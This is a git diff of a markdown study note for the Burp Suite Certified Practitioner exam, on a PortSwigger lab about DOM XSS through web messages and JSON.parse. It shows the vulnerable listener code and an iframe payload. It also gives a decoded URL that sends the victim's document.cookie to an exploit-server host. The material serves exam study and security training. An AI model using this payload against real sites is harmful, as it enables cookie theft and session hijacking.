@@ -32,42 +32,49 @@ The acronym BSCP has nice simular ring like OSCP  :)
 
 ## AddEventListener JSON.parse  
 
->DOM XSS using web messages and JSON.parse  
+>Target use web messaging and parses the message as JSON. Exploiting the vulnerability by constructing an HTML page on the exploit server that exploits DOM XSS vulnerability and steal victim cookie.  
+
+>vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
 
 ```JavaScript
 <script>
-                        window.addEventListener('message', function(e) {
-                            var img = document.createElement('img'), ACMEplayer = {element: img}, d;
-                            document.body.appendChild(img);
-                            try {
-                                d = JSON.parse(e.data);
-                            } catch(e) {
-                                return;
-                            }
-                            switch(d.type) {
-                                case "page-load":
-                                    ACMEplayer.element.scrollIntoView();
-                                    break;
-                                case "load-channel":
-                                    ACMEplayer.element.src = d.url;
-                                    break;
-                                case "player-height-changed":
-                                    ACMEplayer.element.style.width = d.width + "px";
-                                    ACMEplayer.element.style.height = d.height + "px";
-                                    break;
-                                case "redirect":
-                                    window.location.replace(d.redirectUrl);
-                                    break;
-                            }
-                        }, false);
-                    </script>
+	window.addEventListener('message', function(e) {
+		var img = document.createElement('img'), ACMEplayer = {element: img}, d;
+		document.body.appendChild(img);
+		try {
+			d = JSON.parse(e.data);
+		} catch(e) {
+			return;
+		}
+		switch(d.type) {
+			case "page-load":
+				ACMEplayer.element.scrollIntoView();
+				break;
+			case "load-channel":
+				ACMEplayer.element.src = d.url;
+				break;
+			case "player-height-changed":
+				ACMEplayer.element.style.width = d.width + "px";
+				ACMEplayer.element.style.height = d.height + "px";
+				break;
+			case "redirect":
+				window.location.replace(d.redirectUrl);
+				break;
+		}
+	}, false);
+</script>
+```  
+
+>To exploit above code inject code into the JSON to change "load-channel" type ....incomplete....  
+
+>Using atob to decoded base64 to this 
+
 ```
-
-> to exploit above code use below hosted exploit server iframe ----- faulty incomplete.....  
-
->atob value decoded === http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=document.cookie  
+http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=document.cookie
+```  
   
-  
+>Hosted exploit server body.  
+
 ```html
 <iframe src=https://0ace001803c77527c0bdbe4c00050092.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({
         type: "load-channel",
@@ -76,7 +83,7 @@ The acronym BSCP has nice simular ring like OSCP  :)
 
 ```  
 
-https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse
+[PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)  
 
 
 
